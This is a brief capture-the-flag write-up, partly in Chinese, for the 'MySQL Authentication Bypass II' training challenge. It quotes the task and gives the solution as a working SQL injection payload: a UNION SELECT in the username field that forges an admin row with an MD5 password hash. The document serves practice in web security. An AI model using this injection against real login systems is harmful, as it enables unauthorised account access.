
# Training: MySQL II

* 题目
``` 
MySQL Authentication Bypass II
This one is the same as MySQL1, but you have to come up with a more advanced injection to trick this authentication.
Your mission is again: Login yourself as admin.
Again you are given the sourcecode, also as highlighted version.

Enjoy!
```

* 解析
``` 
username填写 123' union select 1,'admin',md5('password');#
password填写 password
```

